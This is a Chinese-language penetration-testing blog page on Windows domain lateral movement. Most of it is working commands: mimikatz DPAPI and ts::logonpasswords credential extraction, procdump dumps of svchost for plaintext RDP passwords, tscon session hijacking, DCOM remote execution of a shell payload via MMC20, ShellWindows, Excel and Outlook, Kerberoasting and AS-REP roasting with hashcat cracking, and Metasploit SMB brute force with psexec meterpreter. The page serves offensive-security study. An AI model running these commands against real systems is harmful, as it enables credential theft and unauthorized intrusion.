+<h3 id="使用mimikatz"><a href="#使用mimikatz" class="headerlink" title="使用mimikatz"></a>使用mimikatz</h3><p>使用<code># mimikatz.exe &quot;privilege::debug&quot; &quot;dpapi::cred /in:C:\Users\&lt;用户名&gt;\AppData\Local\Microsoft\Credentials\&lt;凭据文件&gt;&quot;</code>命令获取到指定凭据文件的pddata和guidMasterkey（其中凭据文件可以在<code>C:\Users\&lt;用户名&gt;\AppData\Local\Microsoft\Credentials\</code>内获取）<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1663070301798-d7e49ff9-7385-47b0-ad6c-bb90677b560d.jpeg" srcset="/img/loading.gif" lazyload><br>之后通过<code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::dpapi&quot;</code>命令可以找到guidMasterkey对应的Masterkey<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1663070340949-216ef551-d7cc-4a29-834e-0e82ae3e4892.jpeg" srcset="/img/loading.gif" lazyload></p>
+<p>之后使用下面的命令即可破解凭据获得明文密码</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mimikatz<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;dpapi::cred /in:C:\Users\bunny\AppData\Local\Microsoft\Credentials\4D8F543ACD10B143849414A5085FE4E6 /masterkey:53c01b9679dc0e55b91584781fe13eb1c5faa2694fc693f98838fedd74d3ad371754b9d9d841769882c8e14c965e4ae40a45dce88101cf5831fc4d694cc38e81&quot;</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1663070386528-caac260b-53eb-49fd-8aa7-58a9775d9cc0.jpeg" srcset="/img/loading.gif" lazyload><br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1663070441290-4dcc20b3-1566-4c03-8530-085db1d6b0f3.jpeg" srcset="/img/loading.gif" lazyload></p>
+<h3 id="通过svchosts-exe获取明文凭据。"><a href="#通过svchosts-exe获取明文凭据。" class="headerlink" title="通过svchosts.exe获取明文凭据。"></a>通过svchosts.exe获取明文凭据。</h3><p>由于凭据是明文存储在svchosts中的所以可以直接使用prodump转储svchosts的内存进行查找。<br>不过需要注意的是可能同时有多个svchosts.exe进程。需要通过以下命令确定哪个进程的内存中有rdp明文凭据</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">sc</span> <span class="hljs-variable">queryex</span> <span class="hljs-variable">termservice</span><br><span class="hljs-variable">tasklist</span> <span class="hljs-operator">/</span><span class="hljs-variable">M</span><span class="hljs-operator">:</span><span class="hljs-variable">rdpcorets</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-variable">netstat</span> <span class="hljs-operator">-</span><span class="hljs-variable">nob</span> <span class="hljs-operator">|</span> <span class="hljs-built_in">Select</span><span class="hljs-operator">-</span><span class="hljs-built_in">String</span> <span class="hljs-variable">TermService</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Context</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<p>通过这三个命令获取svchosts的pid号，之后使用procdump转储svchosts获取明文凭据</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">procdump64.<span class="hljs-keyword">exe</span> -<span class="hljs-keyword">ma</span> <span class="hljs-number">4616</span> -accepteula C:\Users\Administrator\Desktop<br></code></pre></td></tr></table></figure>
+<p>转储成功后生成 svchost.exe_210714_012426.dmp 文件，大约 137 MB，RDP 的连接凭据就以明文的形式存储在这个文件里面，如下我们可以通过 strings 命令将明文凭据检索出来，密码位于用户名的下方   </p>
+<h3 id="在已有的RDP中导出："><a href="#在已有的RDP中导出：" class="headerlink" title="在已有的RDP中导出："></a>在已有的RDP中导出：</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>ts::logonpasswords<br></code></pre></td></tr></table></figure>
+<h3 id="rdp劫持"><a href="#rdp劫持" class="headerlink" title="rdp劫持"></a>rdp劫持</h3><p>对于开启rdp的计算机来说，当多个用户进行登录时会产生多个会话，如果此时我们获取到了system权限，就可以通过system权限劫持其他用户的rdp登录目标系统，即使该会话已经断开</p>
+<p>query user 查看主机上存在的其他用户的会话记录，其中有id选项</p>
+<p>tscon id即可切换到其他用户的桌面</p>
+<h2 id="DCOM横向移动"><a href="#DCOM横向移动" class="headerlink" title="DCOM横向移动"></a>DCOM横向移动</h2><p>COM即组件对象模型(Component Object Model，COM) ，是基于 Windows 平台的一套组件对象接口标准，由一组构造规范和组件对象库组成<br>DCOM（分布式组件对象模型）是微软基于组件对象模型（COM）的一系列概念和程序接口，它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是Internet上。利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求。<br>获取本机的DCOM列表：</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">CimInstance</span> <span class="hljs-type">Win32_DCOMApplication</span><br></code></pre></td></tr></table></figure>
+<p>使用DCOM本机执行命令：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$com</span> = <span class="hljs-selector-attr">[activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[type]</span>::<span class="hljs-built_in">GetTypeFromProgID</span>(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;127.0.0.1&quot;</span>))<br><span class="hljs-variable">$com</span><span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.ActiveView</span><span class="hljs-selector-class">.ExecuteShellCommand</span>(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-string">&quot;/c calc.exe&quot;</span>,<span class="hljs-string">&quot;Minimized&quot;</span>)    <br></code></pre></td></tr></table></figure>
+<p><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1666021249191-fd2f7c98-17e8-4b7e-ada8-54f48037e14a.png" srcset="/img/loading.gif" lazyload><br>远程执行命令：</p>
+<p>MMC20.Application：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$com</span> = <span class="hljs-selector-attr">[activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[type]</span>::<span class="hljs-built_in">GetTypeFromProgID</span>(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;192.168.52.138&quot;</span>))<br><span class="hljs-variable">$com</span><span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.ActiveView</span><span class="hljs-selector-class">.ExecuteShellCommand</span>(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-string">&quot;/c C:\shell.exe&quot;</span>,<span class="hljs-string">&quot;Minimized&quot;</span>)<br></code></pre></td></tr></table></figure>
+<p>ShellWindows：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[Activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[Type]</span>::<span class="hljs-built_in">GetTypeFromCLSID</span>(<span class="hljs-string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>,<span class="hljs-string">&quot;192.168.52.138&quot;</span>))<span class="hljs-selector-class">.item</span>()<span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.Application</span><span class="hljs-selector-class">.ShellExecute</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c C:\shell.exe&quot;</span>,<span class="hljs-string">&quot;c:\windows\system32&quot;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
+<p>Excel.Application:</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$com</span> = <span class="hljs-selector-attr">[activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[type]</span>::<span class="hljs-built_in">GetTypeFromprogID</span>(<span class="hljs-string">&quot;Excel.Application&quot;</span>,<span class="hljs-string">&quot;192.168.52.138&quot;</span>))<br><span class="hljs-variable">$com</span><span class="hljs-selector-class">.DisplayAlerts</span> = <span class="hljs-variable">$false</span><br><span class="hljs-variable">$com</span><span class="hljs-selector-class">.DDEInitiate</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c C:\shell.exe&quot;</span>)<br></code></pre></td></tr></table></figure>
+<p>ShellBrowserWindow</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$com</span> = <span class="hljs-selector-attr">[activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[type]</span>::<span class="hljs-built_in">GetTypeFromCLSID</span>(<span class="hljs-string">&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;</span>,<span class="hljs-string">&quot;192.168.52.138&quot;</span>))<br><span class="hljs-variable">$com</span><span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.Application</span><span class="hljs-selector-class">.shellExecute</span>(<span class="hljs-string">&quot;C:\shell.exe&quot;</span>)<br></code></pre></td></tr></table></figure>
+<p>Visio.Application:</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$com</span> = <span class="hljs-selector-attr">[activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[type]</span>::<span class="hljs-built_in">GetTypeFromProgID</span>(<span class="hljs-string">&quot;Visio.Application&quot;</span>,<span class="hljs-string">&quot;192.168.52.138&quot;</span>))<span class="hljs-variable">$com</span>.<span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.Application</span><span class="hljs-selector-class">.shellExecute</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>)<br></code></pre></td></tr></table></figure>
+<p>Outlook.Application:</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$com</span> = <span class="hljs-selector-attr">[activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[type]</span>::<span class="hljs-built_in">GetTypeFromProgID</span>(<span class="hljs-string">&quot;Outlook.Application&quot;</span>,<span class="hljs-string">&quot;192.168.52.138&quot;</span>))<br><span class="hljs-variable">$com</span><span class="hljs-selector-class">.createObject</span>(<span class="hljs-string">&quot;Shell.Application&quot;</span>)<span class="hljs-selector-class">.shellExecute</span>(<span class="hljs-string">&quot;C:\shell.exe&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<h2 id="Kerberoast横向移动"><a href="#Kerberoast横向移动" class="headerlink" title="Kerberoast横向移动"></a>Kerberoast横向移动</h2><p>通过SPN扫描，我们可以发现许多服务。可以通过powershell命令与这些服务建立连接</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">powershell <span class="hljs-keyword">Add</span>-<span class="hljs-keyword">Type</span> -AssemblyName <span class="hljs-keyword">System</span>.IdentityModel<br>powershell <span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span>  <span class="hljs-keyword">System</span>.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/SqlServer.god.org:1433&quot;<br></code></pre></td></tr></table></figure>
+<p>建立连接后，我们获取了相应服务的票据。使用klist查看票据信息，若此票据的加密信息为RC4_HMAC_MD5则可以破解，否则不行<br>使用mimikatz导出票据</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mimikatz</span> <span class="hljs-string">&quot;kerberos::list /export&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>破解票据</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python</span> tgsrepcrack.py pass.txt <span class="hljs-string">&quot;1-40a00000-jack<span class="hljs-variable">@MSSQLSvc</span>~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>除此之外，可以利用Rubues.exe直接获取符合条件的票据</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Rubeus</span>.</span></span>exe kerberoast<br><br></code></pre></td></tr></table></figure>
+
+<p>之后将获取到的hash更改为hashcat可以破解的格式（去除空格和回车）使用hashcat破解</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hashcat -m <span class="hljs-number">13100</span> -<span class="hljs-selector-tag">a</span> <span class="hljs-number">0</span> hash<span class="hljs-selector-class">.txt</span> passwd<span class="hljs-selector-class">.txt</span> <br></code></pre></td></tr></table></figure>
+
+<h2 id="AS-repoasting"><a href="#AS-repoasting" class="headerlink" title="AS-repoasting"></a>AS-repoasting</h2><p>在预身份验证期间，用户哈希将用于加密域控制器将尝试解密的时间戳，以验证正在使用正确的哈希并且没有重播先前的请求。在验证时间戳之后，KDC 将为用户发出一个 TGT。如果预身份验证被禁用，您可以为任何用户请求任何身份验证数据，并且 KDC 将返回一个可以离线破解的加密 TGT，因为 KDC 跳过了验证用户是否真的是他们所说的人的步骤。<br>AS-REP Roasting 会转储禁用 Kerberos 预身份验证的用户帐户的 krbasrep5 哈希值。与 Kerberoasting 不同，这些用户不必是服务帐户。唯一要求是 必须禁用了预认证才能使用</p>
+<p>获取所有符合条件的hash</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python GetNPUser<span class="hljs-selector-class">.py</span> spookysec<span class="hljs-selector-class">.local</span><span class="hljs-selector-class">.user</span> -no-pass<br>rubeus<span class="hljs-selector-class">.exe</span> asreproast<br></code></pre></td></tr></table></figure>
+
+<p>获取hash后复制到攻击机的TXT中，在$krb5asrep$后加上23$，去除空格和回车</p>
+<p>使用hashcat破解</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashcat</span> -m <span class="hljs-number">18200</span> hash.txt Pass.txt<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="域横向移动自动化平台-MSF-CrackMapExec"><a href="#域横向移动自动化平台-MSF-CrackMapExec" class="headerlink" title="域横向移动自动化平台-MSF&amp;CrackMapExec"></a>域横向移动自动化平台-MSF&amp;CrackMapExec</h2><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>批量扫描</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use auxiliary/scanner/smb/smb_login<br><span class="hljs-built_in">set</span> threads 10<br><span class="hljs-built_in">set</span> rhosts 192.168.3.0/24<br><span class="hljs-built_in">set</span> smbdomain god<br><span class="hljs-built_in">set</span> user_file /root/user.txt<br><span class="hljs-built_in">set</span> pass_file /root/pass.txt<br>run<br></code></pre></td></tr></table></figure>
+
+<p>利用</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/windows/smb/psexec<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">bind_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">RHOSTS 192.168.3.32</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">smbuser administrator</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">smbpass admin!@#45</span><br>run<br></code></pre></td></tr></table></figure>
+
+<h3 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h3><p>官方手册：<a target="_blank" rel="noopener" href="https://mpgn.gitbook.io/crackmapexec/">https://mpgn.gitbook.io/crackmapexec/</a></p>
+<p>部分案例：<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/184573.html">https://www.freebuf.com/sectool/184573.html</a></p>
+<p>下载对应release，建立socks连接，设置socks代理，配置规则，调用！</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/cllaubo080004ysut84dm6hhj/" title="BIGIAM CTF writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">BIGIAM CTF writeup</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/cllaubo0l000mysut0nou24qx/" title="内网权限维持">
+                        <span class="hidden-mobile">内网权限维持</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
